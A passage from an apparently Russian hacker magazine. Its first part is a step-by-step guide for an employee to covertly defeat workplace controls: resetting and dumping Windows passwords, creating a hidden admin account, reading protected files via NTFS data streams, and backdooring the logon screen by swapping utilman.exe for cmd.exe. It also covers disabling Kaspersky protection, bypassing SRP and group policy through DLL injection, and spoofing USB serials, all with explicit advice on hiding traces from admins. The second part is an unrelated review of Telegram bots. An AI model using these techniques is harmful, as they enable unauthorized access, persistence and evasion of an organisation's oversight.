не видят выставленные в NTFS атрибуты безопасности и читают все подряд.
   Сделать копию любых данных ты можешь уже на этом этапе. Единствен-
ное возможное препятствие — шифрование разделов. Встроенную защиту
BitLocker помогут преодолеть утилиты ElcomSoft (кстати говоря, как и многие
другие виртуальные заборы), а вот TrueCrypt, VeraCrypt и другие серьезные
криптографические контейнеры придется вскрывать иначе. Проще всего де-
лать это методами социального инжиниринга, поскольку техническая защита
у этих средств на порядок выше, чем психологическая у владельца, — см. ре-
альные примеры из жизни.
   Заменить права доступа тоже несложно. Загрузившись с флешки, ты ста-
новишься админом в той же Windows PE и делаешь с диском что хочешь.
Однако интереснее сохранить права в основной системе, для чего надо
стать админом именно в ней. Для этого удобнее всего воспользоваться од-
ной из утилит для сброса паролей. Например, простейшая программа NT
Password Edit Вадима Дружина была написана более десяти лет назад, но ак-
туальна до сих пор. С ее помощью можно удалить или задать новый пароль
любой учетной записи Windows.





                                                     NT Password Edit



В большинстве случаев этой утилиты оказывается достаточно. Дальше остаются
лишь рутинные операции вроде смены владельца и переустановки разрешений
для выбранных каталогов. Чуть больше возможностей дает еще одна подобная
утилита — Active@ Password Changer. Вместе с другими утилитами Active@ она
добавляется на флешку как крошечный образ .ima, поэтому запуск бесплатной
старой (но еще полезной) версии возможен даже без загрузки WinPE.





      Активируем отключенные аккаунты


Password Changer также позволяет сбросить пароль любой учетной записи
и умеет разблокировать ее, если она была отключена ранее.
  Еще больше функций у программы Reset Windows Password. С ее помощью
можно не только сбрасывать пароли, но и заметать следы взлома.





              Сброс, дамп и заметание следов

Подобно SAMInside, она позволяет копировать пароли и хеши для их анализа
на другой машине — так их проще вскрыть уже в спокойной обстановке (см.
статью «Большой парольный коллайдер» в номере 194). Подобрать админ-
ский пароль куда интереснее, чем просто сбросить его: с исходным паролем
ты будешь меньше светиться в логах, тогда как грубый взлом могут быстро
заметить.
  Еще один тонкий вариант — добавить в систему нового пользователя, на-
делить его желаемыми правами и скрыть эту учетную запись. Если пользова-
телей десятки, то лишнего увидят нескоро. Проделав это, ты сможешь логи-
ниться под обычным аккаунтом, не вызывая подозрений, а при необходимости
запускать любую программу от имени одному тебе известной учетки с полным
доступом. Конечно, полностью спрятать ее не удастся, но хотя бы на экране
приветствия она маячить не будет. Для этого достаточно изменить подраздел
UserList в реестре.

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
    Winlogon

Отыскиваем раздел SpecialAccounts или создаем его, если не нашелся. В этом
разделе ищем или создаем подраздел UserList, а в нем — новый параметр
типа DWORD с именем скрываемой учетки. Если присвоить ему нулевое зна-
чение, то соответствующая учетная запись не будет отображаться ни на экра-
не приветствия, ни в общем списке из панели управления.
  Можно пойти дальше и усилить конспирацию. Для этого отыскиваем клю-
чи с говорящим названием dontdisplaylastusername и DontDisplayLockedUserId
в этой ветке:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\
    Policies\System

Первому присваиваем значение 0x00000001, а второму — 0x00000002. Те-
кущий и последний использованный аккаунт также исчезнут с экрана блоки-
ровки.

ПОТОКИ NTFS ПОМОГУТ ПОЛУЧИТЬ ДОСТУП К ФАЙЛАМ
Как уже отмечалось выше, большинство прав доступа на рабочих компьюте-
рах с Windows задается на уровне файловой системы NTFS. Тут самое время
вспомнить про файловые потоки и особенности синтаксиса. Согласно универ-
сальному соглашению об именовании файлов (UNC), двоеточие отделяет букву
диска от дальнейшего пути. В NTFS этот знак используется еще и как раздели-
тель между собственно именем файла и связанным с ним файловым потоком.
   Если настройки прав для каждого файла и каталога Windows корректны, то
нет разницы, как именно обращаются к объектам файловой системы. Доступ
всегда будет блокироваться при отсутствии необходимых разрешений. Одна-
ко настройка прав — долгая рутинная операция, которую в последние годы ад-
мины часто стали упрощать, используя сторонние программы. Далеко не все
из них (даже сертифицированные) корректно работают с файловыми пото-
ками. Поэтому, если не удается прочитать filename.ext, попробуй обратиться
к потоку данных этого файла с помощью конструкции filename.ext:stream:$DATA
или filename.ext::$DATA.
   Например, если у тебя нет доступа к файлу passwords.txt, то следующая ко-
манда все равно выведет его содержимое на экран:

more < passwords.txt::$DATA

Примерно так же можно скопировать содержимое файла, перенаправив вы-
вод команды more не на экран, а в другой файл.

more < passwords.txt::$DATA > pass.txt

Это не должно срабатывать при корректном выставлении ограничений чтения/
записи, но админы частенько не утруждают себя аудитом прав доступа на каж-
дый объект файловой системы. На реальном компьютере нередко получает-
ся гремучая смесь из явно заданных и унаследованных прав, противоречиями
в которых можно воспользоваться в своих интересах..





                                   Читаем файл из потока данных прямо в консоль

Кстати, о механизмах наследования. Встречаются ситуации, когда админ за-
прещает доступ к подкаталогу для определенных пользователей, но оставляет
для них же полный доступ к директориям верхнего уровня. При этом возникает
явное противоречие, и ограничения перестают действовать. Например, отсут-
ствие прав на чтение файла не работает, если разрешено читать список со-
держащего его каталога. Аналогично и с удалением.

СОЗДАЕМ СЕКРЕТНЫЙ РАЗДЕЛ БЕЗ ПОДДЕРЖКИ
ПРАВ ДОСТУПА
Иногда админы запрещают только выполнение файлов. Например, чтобы
пользователь не смог запустить какую-то программу. Обойти это ограничение
можно, просто скопировав ее на раздел FAT32 (как вариант — на ту же флеш-
ку), где права доступа уже задать невозможно. Их просто не поддерживает
сама файловая система. Если же постоянно пользоваться флешкой слишком
рискованно, то можно сделать хитрее. Один раз запустить с нее любой редак-
тор дисковых разделов, уменьшить размер системного, а на освободившемся
месте создать новый том FAT32 и (опционально) скрыть его.





                                                Создаем скрытый раздел FAT32

Скрытым разделам не присваивается буква диска, поэтому они не отобража-
ются в «Проводнике» и файловых менеджерах. Смонтировать его в Windows
можно через «Управление дисками» — diskmgmt.msc. Необходимые права
для запуска этого инструмента ты уже назначил себе на прошлом этапе, когда
узнавал пароль админа или создавал нового.
   Если на раздел FAT32 копировались документы, базы или медиафайлы,
то они будут открываться без проблем. Ничто не помешает и запускать про-
стой софт, который ставится распаковкой: на новом месте все будет работать,
как и раньше. Вот с установленными программами не все так просто. У них
придется менять пути в настройках. Это либо файлы .cfg и .ini в том же катало-
ге, либо ключи реестра. Изменить ключи можно при помощи удаленного ре-
дактора реестра, запускаемого с флешки в той же WinPE.





                                                 Редактируем реестр другой ОС

С таким инструментом можно обойти и другие ограничения, прописанные
в реестре.

ОБХОДИМ АНТИВИРУС КАСПЕРСКОГО
Большая часть запретов на действия пользователя в Windows реализована че-
рез реестр и права доступа в NTFS. Однако есть и другой вариант: установка
специализированных программ контроля.
   Например, софт «Лаборатории Касперского» загружает собственные драй-
веры из \windows\system32\drivers\ и sysnative\drivers. С их помощью он пере-
хватывает системные вызовы и обращения к файловой системе, контролируя
как работу программ, так и действия пользователя. Обычно админ закрывает
изменение настроек антивирусного софта паролем. Хорошая новость заклю-
чается в том, что есть простые процедуры сброса такого пароля.
   «Антивирус Касперского SOS» и версии для Windows Workstation проверя-
ют имя главного файла. Поэтому достаточно проделать следующее:
•  переименовать avp.exe (загрузившись в WinPE или в безопасном режиме);
•  запустить переименованный файл после обычного входа в систему;
•  зайти в меню «Настройка   Параметры», отключить самозащиту и защиту
   паролем;
•  сохранить настройки, выгрузить антивирь и переименовать его обратно.

При желании можно задать собственный пароль, чтобы админ понял, как ты
мучился, не зная его.
   Этот метод не сработает, если антивирус на твоем компе настраивается
централизованно. Однако ты всегда можешь временно нейтрализовать сторо-
жа описанным выше способом.
  С новыми продуктами Касперского все еще проще. Итальянский консуль-
тант Kaspersky Lab Маттео Ривойра написал скрипт (http://media.kaspersky.
com/utilities/ConsumerUtilities/KLAPR.zip), который автоматически определя-
ет установленную версию антивируса и обнуляет заданный пароль. Из батни-
ка видно, что в 32-битных и 64-разрядных версиях винды он хранится в разных
ветках реестра:

HKEY_LOCAL_MACHINE\SOFTWARE\KasperskyLab\[имя_продукта]\settings
HKEY_LOCAL_MACHINE\SOFTWARE\KasperskyLab\protected\[имя_продукта]\
    settings
HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\KasperskyLab\[имя_продукта]\
    settings

Поэтому либо просто запусти этот bat, либо правь реестр вручную из-под
WinPE. Просто проверь эти ветки и присвой параметру EnablePasswordProtect
нулевое значение DWORD.


                           Продолжение статьи
PCZONE





Начало
статьи
 ВЕРНИТЕ




       КАК ОБОЙТИ ОГРАНИЧЕНИЯ ПРАВА!
       НА РАБОЧЕМ КОМПЬЮТЕРЕ



ДОБАВЛЯЕМ ТРОЯНСКУЮ ЗАКЛАДКУ
Мультизагрузочная флешка — настоящий швейцарский нож. После загруз-
ки с нее можно разблокировать скрытые учетные записи, сбрасывать пароли,
править реестр и вообще творить что угодно. Проблема одна: ее могут заме-
тить. Поэтому сделаем себе дополнительный лаз, который не требует внешних
инструментов. Создать его можно в том числе и через консоль восстановле-
ния. Так или иначе, ты можешь сделать копию файла utilman.exe, а затем заме-
нить его на cmd.exe. Сначала сделаем копию исходного файла.

copy %windir%\system32\utilman.exe %windir%\system32\utilman-new.exe

Затем перезаписываем исходный файл utilman.exe файлом cmd.exe:

copy %windir%\system32\cmd.exe %windir%\system32\utilman.exe

Буква диска (системного раздела) в переменной %windir% не обязательно бу-
дет C:\. Ее можно узнать при помощи утилиты diskpart — командой list volume.
   После замены  utilman.exe файлом  cmd.exe при следующей  загруз-
ке Windows ты увидишь привычный экран приветствия. Только при клике
на «Специальные возможности» теперь будет открываться командная строка.
  В ней можно делать все то же, что и обычно. Например, можешь выяснить
актуальный список учетных записей командой net user и поменять их параме-
тры. Делаешь с любым аккаунтом что угодно — активируешь и деактивируешь,
меняешь пароли, изменяешь сроки их действия и так далее. Подробнее интак-
сисе читай в справке на сайте Microsoft.

ОБХОДИМ ЛОКАЛЬНЫЕ ГРУППОВЫЕ ПОЛИТИКИ
Подробнее о политиках поговорим чуть позже (не люблю я их, политиков),
а пока разберем простейший пример — ограничение на запуск программ че-
рез административные шаблоны.
  Админы очень любят редактор gpedit.msc. Одна из самых востребован-
ных настроек в нем называется «Выполнять только указанные приложения
Windows». Обычно при помощи этого инструмента офисному планктону раз-
решают запуск только приложений из белого списка. В него вносят Word,
Excel, калькулятор и прочие безобидные вещи. Все остальные имена испол-
няемых файлов автоматически попадают под запрет. Обрати внимание: имен-
но имена. Поэтому берем тот же cmd.exe или totalcmd.exe, переименовываем
в winword.exe и спокойно пользуемся. Посмотреть (и поменять) ограниче-
ния можно через тот же редактор удаленного реестра в WinPE. Они записаны
в этой ветке:

HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\
    Policies\Explorer\RestrictRun


СТРЯХИВАЕМ ДОМЕННЫЕ ПОЛИТИКИ
В домене компьютеры управляются централизованно через групповые полити-
ки, однако и этот заслон можно преодолеть. Самый простой способ — не дать
политикам загрузиться. Для этого запускаешь Windows в безопасном режиме
или просто отключаешь машину от локальной сети при включении. Во втором
случае ты сможешь залогиниться в домен даже без физического подключения
к нему, поскольку Windows кеширует данные предыдущего входа и при потере
связи с контроллером домена выполняет проверку локально.
   После входа можешь снова подключиться к локалке и работать как обычно,
только уже без активных политик. Минус этого способа состоит в неизбира-
тельном подходе. В политиках записаны не только ограничения, но и дополни-
тельные ресурсы, вроде выделенной сетевой папки. Впрочем, к этому вре-
мени у тебя уже должны быть достаточные права, чтобы восстановить утрату
самостоятельно.

ОБХОДИМ ПРОДВИНУТЫЕ ЗАПРЕТЫ НА ЗАПУСК ПРОГРАММ
В домене используется более продвинутый инструмент ограничения запуска
программ — SRP. Он умеет проверять, помимо имён исполняемых файлов, их
пути, хеши и сертификаты. Простым переименованием экзешника его не оду-
рачить. Как же быть? Аналогично: просто не дать системе увидеть эти ограни-
чения.
  По умолчанию контролируется только запуск программ, но не динамиче-
ских библиотек, поскольку тотальная проверка отнимает слишком много ре-
сурсов.





          Дефолтные настройки SRP

Еще в 2005 году Марк Руссинович написал утилиту Gpdisable. Она выполняет
инжект библиотеки в любой процесс, и тот перестает видеть запреты группо-
вой политики из соответствующей ветки реестра.

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Safer\
    CodeIdentifiers

Затем схожую тактику реализовал Эрик Ракнер (Eric Rachner) в своей утили-
те Group Policy Bypassing Tool — тогда он еще был руководителем команды
Application Consulting Engineering (ACE team) в Microsoft.
  Обе программы имеют одинаковый недостаток: чтобы запустить их и вне-
дрить .dll, пользователь уже должен иметь некоторые административные при-
вилегии. Но если они у него есть, то смысл в этих утилитах теряется. Локально-
му админу ничто не мешает убрать ограничения доменных политик вручную.
  В блоге ACROS Security лет пять назад был описан другой способ обхода
доменных ограничений, применимый в реальной ситуации с правами простого
пользователя.
1. Переименовываем внедряемую библиотеку gpdisable.dll в deskpan.dll.
2. Создаем новую папку с именем files.{42071714-76d4-11d1-8b24-
   00a0c9068ff3}.
3. Помещаем в нее файл deskpan.dll и открываем папку.
4. Создаем в ней новый документ .rtf и открываем его.

При этом загружается WordPad, который подгружает в память gpdisable.dll под
видом deskpan.dll. Разберём метод подробнее.
   Deskpan.dll — это расширение CPL панорамирования дисплея, стандарт-
ная библиотека в Windows, на которую не распространяются ограничения
SRP. В системе она зарегистрирована как COM-сервер с глобальным иден-
тификатором класса {42071714-76d4-11d1-8b24-00a0c9068ff3}. Если мы за-
пускаем доверенное приложение из папки, в названии которой есть ID этого
класса после точки, то оно создает экземпляр COM-сервера и выполняет за-
грузку deskpan.dll из текущего рабочего каталога.
  В изложенном варианте этот метод работает только в Windows XP,
но для более свежих версий винды его несложно модифицировать. Принцип
остается прежним.
   Например, в Windows 7 можно использовать COM-сервер AnalogCable
Class (\System32\PsisDecd.dll), зарегистрированный с идентификатором CLSID
{2E095DD0-AF56-47E4-A099-EAC038DECC24}. При обращении к PsisDecd.dll
загружается библиотека ehTrace.dll, поиски которой начинаются с текущего
каталога. Поэтому аналогичный сценарий внедрения gpdisable.dll можно реа-
лизовать даже с помощью «Блокнота».
1. Переименовываем gpdisable.dll в ehTrace.dll.
2. Создаем новый текстовый документ.
3. Создаем каталог с именем files.{2E095DD0-AF56-47E4-A099-
   EAC038DECC24} и помещаем в него оба файла (библиотеку и текстовый
   документ).
4. Дважды кликаем на текстовый файл и открываем в «Блокноте» пункт «Сохра-
   нить как».

В этот момент в память загружается gpdisable.dll.

СОЗДАЕМ ХИТРЫЕ ЯРЛЫКИ
Трюки из предыдущего раздела возможны потому, что в Windows наря-
ду с обычными папками используются папки-ярлыки с предопределенными
функциями. Например, «Мой компьютер», «Панель управления» или «Прин-
теры». Все они реализованы как COM-серверы с известными идентификато-
рами класса (CLSID). Всего их больше ста, поэтому перечислю только новые
в Windows 10:
•  {3936E9E4-D92C-4EEE-A85A-BC16D5EA0819} — часто используемые пап-
ки;
•  {018D5C66-4533-4307-9B53-224DE2ED1FE6} — OneDrive;
•  {679f85cb-0220-4080-b29b-5540cc05aab6} — панель быстрого доступа;
•  {BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6} — безопасность и обслужи-
   вание.

Любой из них можно использовать для скрытого запуска своих программ.
  В примере ниже я создаю в пользовательской директории подпапку с име-
нем LPT3.{BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6}. Имя до точки запре-
щено в Windows, поскольку совпадает с названием порта. Чтобы его создать,
потребуется запутать командный интерпретатор последовательностью  \\.\
и передать полный путь к создаваемому каталогу как аргумент в кавычках.





                                           Создаем скрытую неудаляемую папку

После этой команды получаем неудаляемый штатными средствами каталог,
который в проводнике отображается как LPT3. При двойном клике на нем со-
держимое папки не открывается. Вместо этого запускается «Центр безопас-
ности и обслуживания». При этом лежащие внутри папки экзешники будут до-
ступны из командных файлов (.bat и .cmd) и из реестра (например, в секции
автозагрузки).

ВКЛЮЧАЕМ USB
Одним из препятствий для использования флешки может быть отключение ад-
мином портов USB на твоем компьютере. Сделать это можно разными спосо-
бами, поэтому и методы противодействия требуются разные.

1. Порты физически отключены
Такое возможно только с дополнительными портами, которые подключаются
кабелем к материнской плате. Задние порты распаяны на самой материнке,
и их минимум две штуки. Поэтому принеси из дома копеечный хаб, воткни его
вместо мышки или клавиатуры и подключай всю штатную периферию через
него. Второй порт оставь для загрузочной флешки.

2. Порты отключены в BIOS/UEFI
Админ может отключить как порты вообще (редкий случай), так и отдельную
опцию USB Boot. Именно она отвечает за возможность загрузки с USB-носи-
телей. Как входить в настройки BIOS, мы уже разобрали, а отыскать нужную
опцию не составит труда.

3. Удалены драйверы контроллера USB
Хитрые админы просто сносят драйверы USB через диспетчер устройств,
но тебя это не остановит. Загрузиться с флешки отсутствие драйверов не по-
мешает. Став локальным админом, ты легко доустановишь отсутствующие
драйверы — Windows сама предложит это сделать.

4. Заблокированы отдельные устройства USB
Более тонкий метод — запрет использования именно USB-накопителей.
При этом другие типы устройств с интерфейсом USB продолжают работать.
Задается ограничение через ветку реестра

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR

При значении параметра Start 0x00000004 использование флешек и внешних
дисков запрещено, а при 0x00000003 — разрешено. Бороться с этим можно
тем же методом, что и в предыдущем пункте: загружаемся с флешки и меняем
секцию USBSTOR через офлайновый редактор реестра.

5. USB-накопители запрещены через групповую политику
Редактор групповых политик позволяет задать административный шаблон,
запрещающий доступ к съемным запоминающим устройствам. Вновь загру-
жаемся с флешки, узнаем пароль локального админа (или сбрасываем, если
не удалось узнать), попутно активируем учетку, если она была отключена. По-
сле этого запускаем gpedit.msc и отключаем запрет.





                           Отключаем запрет на использование USB-накопителей

6. Ограничены права на чтение файлов usbstor.inf и usbstor.
pnf в каталоге \Windows\Inf
Очередной трюк с правами NTFS. Если невозможно обратиться к этим файлам
в ограниченной учетной записи, то не будут подключаться флешки. Использу-
ем права локального админа либо просто перемещаем эти файлы через WinPE
на том FAT32. После обратного перемещения в \inf\ права доступа слетят.

7. Подключение устройств по USB контролируется отдельной
программой
В помощь админам было написано множество утилит для ограничения ис-
пользования флешек и внешних дисков. Большинство таких программ про-
сто меняет значение упомянутой выше ветки реестра, но есть и продвинутые
варианты. Такие умеют запоминать разрешенные флешки по номеру тома
(VSN — Volume Serial Number) и блокировать остальные. Можно просто выгру-
зить процессы этих программ из памяти или подменить VSN. Это 32-битное
значение, которое присваивается тому при его форматировании по значению
текущей даты и времени.





                                                   Узнаем серийный номер тома

Узнать VSN доверенной флешки можно командой vol или dir. С помощью про-
граммы Volume Serial Number Changer присваиваешь такой же номер своей
флешке и свободно ей пользуешься. Для надежности замени еще и метку тома
(просто через свойства диска).
   Другой вариант противодействия — нарушать работу программ контроля,
временами загружаясь с флешки и меняя названия ее рабочих файлов (или
удаляя из автозагрузки). Если делать все аккуратно, админ сочтет программу
глючной и сам удалит ее.
   Неожиданное препятствие для использования флешек возникает на ком-
пах с посредственным блоком питания (читай — на большинстве дешевых ра-
бочих машин) безо всяких стараний админа. Дело в том, что шина 5 В проса-
живается настолько, что флешке не хватает питания. В таком случае отключи
другое устройство из соседнего (парного) USB-порта или используй активный
хаб с собственным блоком питания. Через него можно запитать хоть внешний
винчестер.

ПОДКЛЮЧАЕМСЯ К ИНТЕРНЕТУ
Масса ограничений на работе касается использования интернета. В общем
случае их можно обойти, перенаправляя весь трафик на неподконтрольный
компании сервер. Например, использовать анонимный прокси-сервер через
браузерный аддон FoxyProxy или аналогичный. Если менять адрес прокси по-
чаще, то вычислить его использование будет сложнее. Подняв прокси-сервер
дома, ты повысишь скорость и защищенность соединения, а заодно и полу-
чишь доступ к своей локалке..





                                         Добавляем свой или публичный прокси

Иногда проблема заключается не столько в за-
прете посещения определенных сайтов, сколько
в квоте трафика. Сделать безлимитное подключе-
ние сегодня проще всего с помощью смартфона.
Подключив выгодный тариф на мобильный интер-
нет, можно раздавать трафик по Wi-Fi или исполь-                                 WWW
зовать  USB-tethering.  Подключенный  кабелем
смартфон не светится в эфире и вызывает меньше     Современный сервис подбора
подозрений. Ты его заряжаешь от рабочего ком-     паролей к BIOS по коду ошибки
пьютера, какие проблемы?                                                             Программа Кристофа Гренье
  Все описанные методы имеют ограниченное     для дампа CMOS и обнуления
применение из-за многообразия вариантов кон-             пароля (zip)
фигурации. Пошаговые  инструкции  устаревают                                                                  Скрипт для сброса пароля
быстро, но общие принципы остаются неизменны-      от разных версий антивируса
ми годами.                                                           Касперского (zip)

                                                                      Утилита для смены VSN
PCZONE
ТЕ САМЫЕ
ДРОИДЫ
28 ПОЛЕЗНЫХ БОТОВ
ДЛЯ TELEGRAM





Пик шумихи вокруг чат-ботов, скорее все-
го, уже пройден. Но что полезного она при-
несла человечеству? Мы отправились во-
рошить залежи ботов для мессенджера
                                                                           Андрей ПисьменныйTelegram, чтобы сделать подборку, в кото-
рой любой пользователь (а тем более гик)
найдет для себя что-нибудь ценное.

Кладбище роботов
Признаться честно, поиски оказались не самым приятным занятием: свер-
кавшая еще год назад армия роботов постепенно превращается в свалку.
Более половины потенциально полезных ботов перестали функционировать
и просто-напросто не реагируют на запросы. Больше не отвечает бот «Флиб-
усты»; полезнейший Utilsbot, который помогал бороться с разными видами ко-
дирования, не подает признаков жизни; закрыт SteamSaleBot, оповещавший
о распродажах в Steam, — остались лишь исходники, выложенные автором
на GitHub.
   Читатель из будущего, обрати внимание: статья написана в сентябре 2016
года, и, если кто-то из авторов вдруг забросит свое творение, не обессудь.
Далеко не все разработчики готовы поддерживать серверы и ничего не полу-
чать взамен, а пристойной модели монетизации для ботов пока не придумали.
   Отчаиваться, однако, пока рано. Есть надежда, что самые слабые боты уже
отвалились, а те, что выжили, продержатся еще хотя бы пару лет. Нам удалось
найти почти три десятка ботов, которые по-прежнему в строю и готовы прино-
сить пользу любому, кто обратится.

Поиск и базы данных

@ImageBot
Это простейший бот для поиска картинок. Пишем ему /get что-нибудь и по-
лучаем в ответ картинку. Повторяем запрос и получаем другую картинку. Если
написать /getgif, то бот поищет анимированный GIF. Такого бота бывает
полезно подключить к групповому чату и вставлять в разговор изображения,
не переключаясь в браузер и не шаманя с сохранением файлов.





@ImageSearchBot
Гораздо более продвинутая вариация на тему поиска картинок, созданная
программистами «Яндекса». Отличается тем, что в приватном варианте пони-
мает запросы без команды, а также выдает кнопку More — если хочешь повто-
рить запрос, просто дави на нее. Иногда бывают полезны и кнопки с уточнени-
ем запроса — их предлагают автоматически в зависимости от темы.





Встроенные боты

В январе 2016 года разработчики Telegram добавили в мессенджер так назы-
ваемых инлайновых ботов. Эти боты встроены прямо в клиент, и специально
подключать их не нужно. Достаточно написать название бота в строке ввода
сообщения, и можно взаимодействовать с ним, не покидая беседу. Эта функ-
ция поддерживается не во всех клиентах, но в мобильных приложениях она уже
есть. Список встроенных ботов пока небольшой:
@pic — поиск по картинкам, практически полная замена @ImageBot;
@gif — то же самое, но для анимированных гифок;
@vid — поиск по YouTube;
@bing — поиск в интернете через Bing;
@wiki — поиск по «Википедии» и Wikimedia, который по непонятным причинам
не дружит с русским языком;
@imdb — поиск по базе данных IMDB, ищет только фильмы;
@bold — предлагает обернуть текст в значки, которые задают курсив, жирный
или моноширинный шрифт. Смысл не совсем ясен — проще набрать сами сим-
волы.


@Wolframbot
Мегаполезный бот, служащий интерфейсом к сервису Wolfram Alpha. Если ты
вдруг не в курсе, это мощнейший движок, который знает безумное количество
величин, измерений и фактов, может делать подсчеты (включая решение урав-
нений и интегралов) и так далее и тому подобное. В общем, главное — знать,
как правильно спрашивать. Делать запросы через Telegram удобно, а вот от-
веты заметно уступают выдаче в виде веб-страницы: они состоят из несколь-
ких мелких картинок с подписями.





@mnp_bot
Бот, который ищет информацию о телефонах в базе данных. К сожалению,
не содержит справочника абонентов и выдает только данные о регионе и опе-
раторе связи. Тем не менее способен пригодиться: к примеру, когда кто-то
звонил с номера со странным префиксом, можно не гуглить, а спросить у бота.





@AvinfoBot
Еще одна база данных, на этот раз автомобильных номеров. Для автомоби-
листов совершенно незаменимая штука: можно вбить номерной знак, VIN или
номер телефона владельца машины и получить в ответ остальную информа-
цию. Бот снабжен даже системой распознавания текста на картинках — если
отправить фотографию с ясно видным номером, то он будет расшифрован
и использован для поиска. Еще можно слать ссылки на auto.ru, avito.ru и darom.
ru. Единственный недостаток — бот иногда спамит саморекламой.





Безопасность

@Temp_mail_bot
Этот бот генерирует временные почтовые ящики в домене @lackmail.ru. Соз-
дав ящик, можно смотреть, что на него пришло, — на сайте temp-mail.ru или
через самого бота. Обрати внимание, что адресат тоже может получить до-
ступ к ящику, так как для авторизации на сайте достаточно имени пользовате-
ля. Однако это не столь важно, особенно если учесть, что одноразовые ящики
обычно создаются под одного адресата, который к тому же чаще всего оказы-
вается автоматизированной системой. А через десять минут ящик все равно
будет автоматически уничтожен.





@DrWebBot
Бот компании Dr.Web, который прямо в чате проверяет файлы на наличие ви-
русов. По сути, просто другой интерфейс для онлайновой проверки, доступ-
ной на сайте. Потенциально полезная особенность — бота можно добавить
в группу, и он будет автоматически сканировать все поступающие файлы
и ссылки. Ограничение на размер файла — 10 Мбайт.





@vulnersBot
Vulners — это мощнейший агрегатор информации об уязвимостях. Если ты
не вылезаешь из Telegram, то, возможно, тебе будет удобно посылать запро-
сы к Vulners, не переключаясь в браузер. Зафрендив бота, просто набери ко-
манду /search и свой запрос (подробнее о синтаксисе команд и возможно-
стях Vulners читай в нашей июньской статье). Вторая полезная команда — это
/subscribe. Укажи после нее запрос, и каждый раз, когда появится новый ре-
зультат, ты получишь оповещение.





@phpscanbot
Бот, проверяющий файлы PHP и JS на предмет уязвимостей. Работает анало-
гично бесплатной версии программы AI-Bolit (подробнее о ней читай в статье
«Антивирус для сайта» в «Хакере» за март 2014 года). Учитывая, что база уяз-
вимостей не то чтобы очень большая, а файлы для проверки нужно загружать
по одному, удобство практического применения бота под вопросом. Зато мо-
жешь изучить исходники сканера, выложенные автором на GitHub.





@httpresponsebot
Простенький, но тем не менее полезный бот для проверки возвращаемого
сайтами статуса HTTP. Просто пишешь URL или IP и через секунду видишь ста-
тус. Расшифровку статусов можешь подсмотреть в «Википедии».





@key_generator_bot
Бот для создания рандомных ключей, которые годятся для различных кодов
и паролей. Сначала назначаешь длину ключа, затем выбираешь, из каких сим-
волов его составлять: это могут быть цифры, буквы, цифры и буквы или все
вместе плюс случайные символы (режим super8).





                           Продолжение статьи
PCZONE


    Начало статьи
ТЕ САМЫЕ
ДРОИДЫ
28 ПОЛЕЗНЫХ
БОТОВ
ДЛЯ TELEGRAM





Полезности

@orfobot
Еще один бот — обертка вокруг простой, но полезной функции — проверки ор-
фографии. Подключив бота, без всяких команд шли ему слова или куски текста.
Ответ будет содержать список слов с ошибками и исправленный вариант. По-
лезно, когда общаешься с кем-то в «Телеграме» и не хочешь выдавать пробе-
лы в образовании. Разработчик бота усиленно рекламирует другое свое творе-
ние — @Jimmy_chatbot. Это комбайн с кучей разных функций, в числе которых
проверка орфографии, конвертация валют, калькулятор и прочие мелочи.





                                                                           Андрей Письменный




@YTranslateBot
Второй бот, созданный в стенах «Яндекса». Он предоставляет доступ к движку
сервиса Yandex Translate и переводит слова или куски текста с одного языка
на другой. На выбор 12 языков: основные европейские, узбекский, турецкий
и еще парочка. Командой /setmylang задаешь, с какого языка переводить,
командой /tolang — на какой. К сожалению, бот по возможностям сильно
уступает сайту: там есть не только выбор из 87 языков, включая латынь и эль-
фийский, но и автоматический вывод синонимов для каждого слова.





@lingvobot
Прости, если мы утомили тебя гуманитарными штучками, скоро мы вернем-
ся к техническим ботам. Однако иметь в друзьях бота Lingvo не повредит. Он
переводит слова с русского на английский и обратно, причем в отличие от @
YTranslateBot не требует вручную переключать направление. Обидно, что,
как и в случае с Yandex Translate, бот сильно уступает сайту: он выдает од-
но-два определения, тогда как для того же слова даже в вебовой версии Lingvo
может быть дюжина значений. Выбрать другой иностранный язык тоже нельзя.





@GitHubBot
Если у тебя есть аккаунт на GitHub, а в нем хотя бы один живой проект, то
этот бот обязательно должен привлечь твое внимание. После подключения
к API GitHub ты сможешь получать уведомления о поступающих комментариях
и даже отправлять ответы прямо из мессенджера. Несложно придумать еще
десяток полезных вещей, которые мог бы делать такой бот, но и то, что есть, —
уже неплохо.





@QR_Wizardbot
«QR-волшебник», как несложно догадаться, помогает работать с QR-кодами.
Если хочешь создать код, просто отправь боту строку текста или ссылку. QR
Wizardbot переспросит, нужно ли шифровать, и вернет картинку с кодом. Есть
и функция расшифровки — скармливаешь боту фотографию, он пропускает ее
через свой OCR и, если повезет, выдает содержимое QR-кода. Распознава-
ние обычно не спотыкается ни о низкое качество изображения, ни о лишние
объекты на снимке. Главное, чтобы сам код был хорошо виден.





@Pomodoro_timer_bot
Техника Pomodoro, также известная как «метод помидора», заключается в сле-
дующем. Для улучшения концентрации ты заводишь таймер (кухонные тайме-
ры часто делают в виде помидора, отсюда название) и работаешь не покла-
дая рук, пока он не зазвонит, — обычно через 25 минут. Снова ставишь его
на пять минут и занимаешься всеми посторонними вещами, на которые меч-
тал отвлечься, пока работал. Теперь повтори цикл несколько раз, пока работа
не будет сделана. Существует масса софтверных реализаций «помидора», @
Pomodoro_timer_bot — одна из них. Напиши боту цифру, и он заведет таймер
на соответствующее число минут. Еще удобнее функция /start_sprint — она
сделает четыре повторения по формуле 25 + 5 минут.





@GetStatsbot
Этот мощнейший бот для работы с Google Analytics пришел в Telegram из ко-
мандного мессенджера Slack. Подключив его к аккаунту Google, ты можешь
запрашивать аналитику о своем сайте при помощи команд, напоминающих
естественный язык. К примеру, команда sessions yesterday покажет график
посещаемости за предыдущий день, users now выдаст число пользователей,
которые находятся на сайте в данный момент, users  by  page покажет топ
наиболее просматриваемых сегодня страниц. Никто не мешает и комбиниро-
вать запросы. К примеру, написав pageviews by browser last  month, ты
увидишь круговую диаграмму, которая показывает, какие браузеры наиболее
активно использовались в прошлом месяце. В общем, для владельцев сай-
тов — абсолютный маст-хэв.





@PollBot
